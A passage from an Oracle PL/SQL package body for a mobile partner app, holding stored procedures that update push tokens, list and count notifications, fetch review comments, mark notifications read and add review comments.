        THEN --update info
            UPDATE MP_PARTNER_DEVICE
            SET DEVICE_TOKEN = p_pushToken
            WHERE Partner_Id = l_partnerId;
        ELSE --create new info
            INSERT INTO MP_PARTNER_DEVICE (
            DEVICE_ID, Partner_Id, FIRST_LOGIN, LAST_LOGIN, DEVICE_TOKEN
            ) VALUES (
            SEQ_MP_PARTNER_DEVICE_ID.NEXTVAL, l_partnerId, SYSDATE, SYSDATE, p_pushToken
            );
        END IF;
    
        l_count := SQL%ROWCOUNT;
    
        OPEN ret FOR SELECT l_count FROM dual;
  EXCEPTION
        WHEN OTHERS THEN
        OPEN ret FOR SELECT 0 FROM dual;
  END UpdatePushToken;
  
  --getNotificationByType
  PROCEDURE getNotificationByType(p_partnerId IN NUMBER,
                                  p_type IN NUMBER,
                                  p_curPage IN NUMBER,
                                  p_pageSize IN NUMBER,
                                  p_total OUT NUMBER,
                                  ret OUT refcur) 
  AS
  BEGIN
    OPEN ret FOR SELECT t.NOTIFICATION_ID notificationId,
                        t.NOTIFICATION_TITLE notificationTitle,
                        t.NOTIFICATION_TYPE notificationType,
                        t.NOTIFICATION_CONTENT notificationContent,
                        t.CREATED_ON createdDate,
                        t.IS_READ isRead
                 FROM (SELECT n.*
                       FROM MP_PARTNER_NOTIFICATION n
                       WHERE (n.STATUS != 3) AND 
                             (n.PARTNER_ID = p_partnerId) AND
                             ((n.NOTIFICATION_TYPE = p_type) OR (p_type = 0))
                       ORDER BY n.NOTIFICATION_ID DESC) t 
                       OFFSET ((p_curPage-1) * p_pageSize) ROWS 
                       FETCH NEXT p_pageSize ROWS ONLY;
                       
    SELECT COUNT(1) INTO p_total FROM (SELECT n.*
                                       FROM MP_PARTNER_NOTIFICATION n
                                       WHERE (n.STATUS != 3) AND 
                                             (n.PARTNER_ID = p_partnerId) AND
                                             ((n.NOTIFICATION_TYPE = p_type) OR (p_type = 0))
                                       ORDER BY n.NOTIFICATION_ID DESC) t;
  END getNotificationByType;
  
  --getCountNotificationByType
  PROCEDURE getCountNotificationByType(p_partnerId IN NUMBER,
                                           p_type IN NUMBER,
                                           p_total OUT NUMBER,
                                           ret OUT refcur)
  AS
  BEGIN 
    SELECT COUNT(1) INTO p_total FROM MP_PARTNER_NOTIFICATION mpn 
                                 WHERE (mpn.NOTIFICATION_TYPE = p_type) AND
                                       (mpn.PARTNER_ID = p_partnerId) AND
                                       (mpn.STATUS != 3); 

  END getCountNotificationByType;
  
  --getNotificationDetail	
  PROCEDURE GetPartnerReviewComments(p_partnerId NUMBER, 
                                     p_notificationId NUMBER,  
                                     ret OUT refcur) 
  AS
  BEGIN
      OPEN ret FOR SELECT DISTINCT t.*
                   FROM(SELECT t.*
                        FROM (SELECT p_notificationId notificationId,
                                     (CASE r.OBJECT_ID WHEN r.DEAL_ID -- >0
                                                       THEN r.OBJECT_ID 
                                                       ELSE r.DEAL_ID END) 
                                                       objectId,
                                     (CASE r.OBJECT_ID WHEN r.DEAL_ID -- >0
                                                       THEN 1 
                                                       ELSE 2 END) 
                                                       objectType,
                                     (CASE r.OBJECT_ID WHEN r.DEAL_ID -- >0
                                                       THEN '' 
                                                       ELSE (SELECT TITLE FROM EV_VOUCHER_PARTNER WHERE VOUCHER_PARTNER_ID = r.DEAL_ID)  END) 
                                                       objectName,
                                     (CASE r.OBJECT_ID WHEN r.DEAL_ID -- >0
                                                       THEN (SELECT IMAGE_PATH FROM MP_PARTNER_GALLERY WHERE PARTNER_ID = r.OBJECT_ID AND IS_AVATAR = 1 AND ROWNUM <=1)
                                                       ELSE (SELECT THUMBNAIL FROM EV_VOUCHER_PARTNER WHERE VOUCHER_PARTNER_ID = r.DEAL_ID)  END) 
                                                       objAvatar,
                                     r.CREATED_ON reviewDate,
                                     r.SCORE_AVG reviewRating,
                                     r.REVIEW_ID reviewId,
                                     r.ASSESSOR_NAME reviewBy,
                                     r.TITLE reviewTitle,
                                     r.CONTENT reviewContent
                             FROM MP_REVIEW PARTITION(MP_REVIEW_PARTNER) r, MP_MEMBER m
                             WHERE (r.REVIEW_ID = (SELECT OBJECT_ID FROM MP_PARTNER_NOTIFICATION WHERE NOTIFICATION_ID = p_notificationId)) AND 
                                   (r.OBJECT_ID = p_partnerId) AND 
                                   (r.OBJECT_TYPE = 2) AND 
                                   (r.IS_ACTIVE = 1)
                             ) t 
                   ) t ;
  END GetPartnerReviewComments;
  
  PROCEDURE GetListReviewComment(p_notificationId NUMBER, ret OUT refcur)
  AS
    v_REVIEW_ID NUMBER := 0;
  BEGIN
    SELECT DISTINCT OBJECT_ID INTO v_REVIEW_ID FROM MP_PARTNER_NOTIFICATION WHERE (NOTIFICATION_ID = p_notificationId);
    OPEN ret FOR SELECT COMMENT_ID commentId, 
                        CREATED_ON commentDate,
                        COMMENT_CONTENT commentBody,
                        COMMENTERS_NAME commentBy
                 FROM MP_REVIEW_COMMENT
                 WHERE (REVIEW_ID = v_REVIEW_ID) AND
                       (IS_ACTIVE = 1);
  END GetListReviewComment;
  
  --readNotification	
  PROCEDURE ReadNotification(p_partnerId NUMBER, p_type NUMBER, p_notificationId NUMBER, ret OUT refcur) 
  AS
  BEGIN
        IF(p_notificationId = 0)
        THEN
            BEGIN
                IF(p_type = 0) --read all notifications
                THEN
                     BEGIN
                        UPDATE MP_PARTNER_NOTIFICATION SET IS_READ = 1 WHERE (PARTNER_ID = p_partnerId) AND (STATUS = 1) AND (IS_READ = 0);
                        OPEN ret FOR SELECT COUNT(1) FROM dual;
                     END;
                END IF; 
                
                IF (p_type > 0) --read all notification by type
                THEN
                     BEGIN
                        UPDATE MP_PARTNER_NOTIFICATION SET IS_READ = 1 WHERE (PARTNER_ID = p_partnerId) AND (STATUS = 1) AND (IS_READ = 0) AND (NOTIFICATION_TYPE = p_type);
                        OPEN ret FOR SELECT COUNT(1) FROM dual;
                     END;
                END IF;
            END;
        END IF;
        
        IF (p_notificationId > 0)
        THEN
            BEGIN
                IF(p_type = 0) --read selected notification
                THEN
                     BEGIN
                        UPDATE MP_PARTNER_NOTIFICATION SET IS_READ = 1 WHERE (NOTIFICATION_ID = p_notificationId) AND 
                                                                             (PARTNER_ID = p_partnerId);
                        OPEN ret FOR SELECT p_notificationId FROM dual;
                     END;
                END IF;
                
                IF (p_type > 0) --read selected notification with type
                THEN
                     BEGIN
                        UPDATE MP_PARTNER_NOTIFICATION SET IS_READ = 1 WHERE (NOTIFICATION_TYPE = p_type) AND 
                                                                             (NOTIFICATION_ID = p_notificationId) AND 
                                                                             (PARTNER_ID = p_partnerId);
                        OPEN ret FOR SELECT p_notificationId FROM dual;
                     END;
                END IF;
            END;
        END IF;
  END ReadNotification;
  
  --commentReview	
  PROCEDURE CommentReview(p_partner_id IN NUMBER,
                          p_review_id IN NUMBER,
                          p_message IN VARCHAR2,
                          o_code OUT VARCHAR2)   
  AS
      v_cnt NUMBER;
      v_COMMENT_ID NUMBER;
      v_MEMBER_ID NUMBER;
      v_COMMENTERS_NAME VARCHAR2(250);
  BEGIN
      --check if exist review
      SELECT COUNT(1) INTO v_cnt FROM mp_review WHERE review_id = p_review_id;
      
      IF(v_cnt <= 0) --non-exist || error data 
      THEN
        o_code:='10'; -- object does not exist
      ELSE --review exist
        BEGIN
          --get member_id
          SELECT MEMBER_ID INTO v_MEMBER_ID FROM MP_PARNER_MEMBER t WHERE t.PARTNER_ID = p_partner_id;
          --get name for comment
          SELECT FULL_NAME INTO v_COMMENTERS_NAME FROM MP_MEMBER t WHERE t.MEMBER_ID = v_MEMBER_ID;
          --set success code
          o_code := '00';
          --insert comment
          v_COMMENT_ID := SEQ_MP_REVIEW_COMMENT_ID.nextval; --use same sequent to set id
          INSERT INTO MP_REVIEW_COMMENT(COMMENT_ID,
                                        REVIEW_ID,
                                        COMMENT_CONTENT,
                                        MEMBER_ID,
                                        COMMENTERS_NAME,
                                        CREATED_ON,
                                        IS_ACTIVE)
                 VALUES(v_COMMENT_ID,
                        p_review_id,
                        p_message,
                        v_MEMBER_ID,
                        v_COMMENTERS_NAME,
                        sysdate,
                        1);
        END;
      END IF;
  END CommentReview;
  
END PKG_APP_MOBILE;

/
